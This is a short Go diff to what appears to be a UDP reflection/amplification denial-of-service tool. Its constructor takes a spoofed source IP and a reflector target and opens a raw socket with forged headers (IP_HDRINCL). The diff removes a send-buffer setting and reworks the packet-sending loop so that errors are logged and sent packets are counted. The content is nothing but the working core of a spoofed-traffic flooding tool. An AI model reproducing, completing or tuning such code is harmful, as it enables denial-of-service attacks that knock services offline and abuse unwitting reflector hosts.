@@ -41,7 +41,6 @@ func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint
 		return nil, err
 	}
 	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
-	unix.SetsockoptInt(fd, unix.SOL_SOCKET, unix.SO_SNDBUF, 4*1024*1024)
 	return &UDPAmplifier{typ: typ, srcIP: src, dstIP: dst, dstPort: reflectorPort, fd: fd}, nil
 }
 
@@ -161,9 +160,13 @@ func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
 					continue
 				}
 				err := unix.Sendto(u.fd, buf[:n], 0, dst)
-				if err == nil {
-					u.packets.Add(1)
+				if err != nil {
+					if seed == 0 {
+						println("sendto err:", err.Error())
+					}
+					continue
 				}
+				u.packets.Add(1)
 			}
 		}(int64(w))
 	}
